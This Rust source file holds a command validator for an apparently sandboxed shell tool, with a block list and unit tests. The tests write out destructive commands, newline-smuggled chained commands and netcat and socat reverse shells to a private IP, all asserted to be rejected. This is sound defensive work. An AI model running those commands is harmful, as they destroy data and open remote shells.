use anyhow::{bail, Result};
use unicode_normalization::UnicodeNormalization;

/// Dangerous commands/patterns that should always be blocked.
const BLOCKED_PATTERNS: &[&str] = &[
    "rm -rf /",
    "rm -fr /",
    "mkfs",
    "dd if=/dev",
    ":(){ :|:& };:",
    "> /dev/sda",
    "shutdown",
    "reboot",
    "init 0",
    "init 6",
    "chmod -r 777 /",
    "chown -r",
    // Privilege escalation
    "sudo ",
    "su ",
    "su\t",
    "doas ",
    // Dangerous executables via absolute path
    "/bin/rm -rf",
    "/usr/bin/rm -rf",
    // Script language code execution (can bypass sandbox)
    "python -c",
    "python2 -c",
    "python3 -c",
    "perl -e",
    "ruby -e",
    "node -e",
    "php -r",
    "lua -e",
    // Network reverse shells
    "nc -e",
    "ncat -e",
    "socat exec:",
    // Disk/data destruction
    "shred ",
    "wipefs",
];

/// Shell metacharacters that indicate command chaining or substitution.
/// These MUST be blocked to prevent sandbox bypass.
const BLOCKED_METACHAR_PATTERNS: &[&str] = &[
    "$(", // command substitution
    "`",  // backtick command substitution
    "|",  // pipe (can pipe to sh/bash)
    ";",  // command separator
    "&&", // logical AND chaining
    "||", // logical OR chaining
];

/// Validate a command against security rules.
pub fn validate_command(command: &str, allowlist: &Option<Vec<String>>) -> Result<()> {
    // H-02: Reject empty/whitespace-only commands
    if command.trim().is_empty() {
        bail!("Empty command is not allowed");
    }

    // Security: NFKC normalization to prevent Unicode homoglyph bypass
    let command = command.nfkc().collect::<String>();

    // C-02: Block embedded newlines/carriage returns and Unicode line separators
    if command.contains('\n')
        || command.contains('\r')
        || command.contains('\u{2028}')
        || command.contains('\u{2029}')
    {
        bail!("Command contains embedded newline or line separator (potential injection)");
    }

    let lower = command.to_lowercase();

    // C-02: Block shell metacharacters that allow sandbox bypass
    for meta in BLOCKED_METACHAR_PATTERNS {
        if lower.contains(meta) {
            bail!("Command contains blocked shell metacharacter: '{}'", meta);
        }
    }

    // Check for blocked patterns
    for pattern in BLOCKED_PATTERNS {
        if lower.contains(pattern) {
            bail!("Command contains blocked pattern: '{}'", pattern);
        }
    }

    // Block rm with both -r and -f flags (any order, split or combined)
    // Token-based detection: normalizes whitespace and checks each flag token
    let normalized = lower.split_whitespace().collect::<Vec<_>>().join(" ");
    if normalized.starts_with("rm ") || normalized.contains("/rm ") {
        let tokens: Vec<&str> = normalized.split_whitespace().collect();
        let has_recursive = tokens.iter().any(|t| {
            t.starts_with('-') && !t.starts_with("--") && (t.contains('r') || t.contains('R'))
        });
        let has_force = tokens
            .iter()
            .any(|t| t.starts_with('-') && !t.starts_with("--") && t.contains('f'));
        if has_recursive && has_force {
            bail!("Command contains dangerous rm flags (-r and -f)");
        }
    }

    // If an allowlist is configured, check the first word (the executable)
    if let Some(ref allowed) = allowlist {
        let first_word = command.split_whitespace().next().unwrap_or("");
        if !allowed.iter().any(|a| a == first_word) {
            bail!(
                "Command '{}' is not in the allowlist. Allowed: {:?}",
                first_word,
                allowed
            );
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_blocked_patterns() {
        assert!(validate_command("rm -rf /", &None).is_err());
        assert!(validate_command("rm -fr /home", &None).is_err());
        assert!(validate_command("shutdown now", &None).is_err());
        assert!(validate_command("sudo reboot", &None).is_err());
        assert!(validate_command("mkfs.ext4 /dev/sda1", &None).is_err());
    }

    #[test]
    fn test_safe_commands() {
        assert!(validate_command("ls -la", &None).is_ok());
        assert!(validate_command("echo hello", &None).is_ok());
        assert!(validate_command("pwd", &None).is_ok());
        assert!(validate_command("whoami", &None).is_ok());
        assert!(validate_command("date", &None).is_ok());
        assert!(validate_command("uname -a", &None).is_ok());
    }

    #[test]
    fn test_allowlist() {
        let allow = Some(vec![
            "ls".to_string(),
            "cat".to_string(),
            "echo".to_string(),
        ]);
        assert!(validate_command("ls -la", &allow).is_ok());
        assert!(validate_command("cat file.txt", &allow).is_ok());
        assert!(validate_command("rm file.txt", &allow).is_err());
    }

    #[test]
    fn test_empty_command() {
        // H-02: Empty commands must be rejected
        assert!(validate_command("", &None).is_err());
        assert!(validate_command("   ", &None).is_err());
        assert!(validate_command("\t", &None).is_err());
    }

    // C-02: Sandbox bypass attack patterns
    #[test]
    fn test_command_substitution_blocked() {
        assert!(validate_command("echo $(rm -rf /tmp)", &None).is_err());
        assert!(validate_command("echo `whoami`", &None).is_err());
    }

    #[test]
    fn test_pipe_blocked() {
        assert!(validate_command("cat /etc/passwd | sh", &None).is_err());
        assert!(validate_command("echo test | bash", &None).is_err());
    }

    #[test]
    fn test_command_chaining_blocked() {
        assert!(validate_command("echo ok; rm -rf /", &None).is_err());
        assert!(validate_command("true && rm -rf /tmp", &None).is_err());
        assert!(validate_command("false || dangerous", &None).is_err());
    }

    #[test]
    fn test_newline_injection_blocked() {
        assert!(validate_command("echo ok\nrm -rf /", &None).is_err());
        assert!(validate_command("cmd\r\ndangerous", &None).is_err());
    }

    #[test]
    fn test_privilege_escalation_blocked() {
        assert!(validate_command("sudo rm -rf /", &None).is_err());
        assert!(validate_command("su -c 'rm -rf /'", &None).is_err());
    }

    #[test]
    fn test_script_execution_blocked() {
        assert!(
            validate_command("python3 -c 'import os; os.system(\"rm -rf /\")'", &None).is_err()
        );
        assert!(validate_command("perl -e 'system(\"rm -rf /\")'", &None).is_err());
        assert!(validate_command("node -e 'require(\"child_process\")'", &None).is_err());
        assert!(validate_command("ruby -e 'system(\"whoami\")'", &None).is_err());
    }

    #[test]
    fn test_rm_flag_splitting() {
        // rm with both -r and -f in any form
        assert!(validate_command("rm -r -f /tmp/stuff", &None).is_err());
        assert!(validate_command("rm -f -r /tmp/stuff", &None).is_err());
        assert!(validate_command("rm -R -f /tmp/stuff", &None).is_err());
        // Combined flags must also be caught
        assert!(validate_command("rm -rf /tmp/stuff", &None).is_err());
        assert!(validate_command("rm -fr /tmp/stuff", &None).is_err());
        // Tab-separated flags must be caught
        assert!(validate_command("rm\t-rf\t/tmp/stuff", &None).is_err());
        // Multiple spaces must be caught
        assert!(validate_command("rm   -r   -f   /tmp/stuff", &None).is_err());
        // rm with only one flag is OK
        assert!(validate_command("rm -r /tmp/safe", &None).is_ok());
        assert!(validate_command("rm -f file.txt", &None).is_ok());
        assert!(validate_command("rm file.txt", &None).is_ok());
    }

    #[test]
    fn test_unicode_line_separator_blocked() {
        // U+2028 (Line Separator) and U+2029 (Paragraph Separator)
        assert!(validate_command("echo ok\u{2028}rm -rf /", &None).is_err());
        assert!(validate_command("cmd\u{2029}dangerous", &None).is_err());
    }

    #[test]
    fn test_absolute_path_rm_blocked() {
        assert!(validate_command("/bin/rm -rf /tmp", &None).is_err());
        assert!(validate_command("/usr/bin/rm -rf /tmp", &None).is_err());
    }

    #[test]
    fn test_reverse_shell_blocked() {
        assert!(validate_command("nc -e /bin/sh 10.0.0.1 4444", &None).is_err());
        assert!(validate_command("socat exec:/bin/sh tcp:10.0.0.1:4444", &None).is_err());
    }
}
